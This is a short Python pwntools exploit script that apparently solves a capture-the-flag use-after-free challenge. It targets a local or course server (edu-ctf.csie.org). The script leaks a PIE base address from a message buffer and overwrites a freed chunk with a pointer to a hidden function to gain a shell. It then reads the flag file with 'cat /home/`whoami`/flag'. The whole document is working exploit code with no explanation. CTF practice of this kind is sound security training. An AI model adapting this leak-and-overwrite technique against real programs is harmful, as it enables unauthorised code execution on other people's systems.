#!/usr/bin/env python
from pwn import *

context.arch = 'amd64'

y = remote( 'localhost' , 10177 )
#y = remote( 'edu-ctf.csie.org' , 10177 )
#y = process( '../uaf/share/uaf' )
#pause()

y.sendafter( 'Size of your message: ' , str( 0x10 ) )
y.sendafter( 'Message:' , 'a' * 8 )

y.recvuntil( 'a' * 8 )

pie = u64( y.recv(6) + '\0\0' ) - 0xa77
success( 'PIE - > %s' % hex( pie ) )

y.sendafter( 'Size of your message: ' , str( 0x10 ) )
y.sendafter( 'Message:' , 'a' * 8 + p64( pie + 0xab5 ) )

y.sendafter( 'Size of your message: ' , str( 0x100 ) )
y.sendafter( 'Message:' , 'a' * 8 )

sleep(0.1)
y.sendline( 'cat /home/`whoami`/flag' )

y.interactive()